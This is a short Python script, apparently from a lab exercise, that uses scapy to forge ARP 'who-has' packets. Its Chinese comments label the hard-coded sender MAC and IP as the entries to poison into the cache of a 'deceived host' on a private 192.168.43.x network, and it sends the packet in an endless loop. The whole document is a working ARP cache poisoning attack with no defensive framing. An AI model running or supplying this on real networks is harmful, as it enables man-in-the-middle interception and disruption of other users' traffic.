#!/usr/bin/python3
from scapy.all import *
E = Ether()
A = ARP(
    op= "who-has",
    # 发送方Mac地址/毒化记录中的MAC
    hwsrc = "d0:c5:d3:03:1d:fd",
    # 发送方IP地址/毒化记录中的IP
    psrc = "192.168.43.49",

    # 目标Mac地址/被欺骗主机MAC
    hwdst="00:0c:29:c8:4b:9f",
    # 目标IP地址/被欺骗主机IP地址
    pdst="192.168.43.8"
)
pkt = E/A
print(pkt.show())
while (1):
    sendp(pkt)


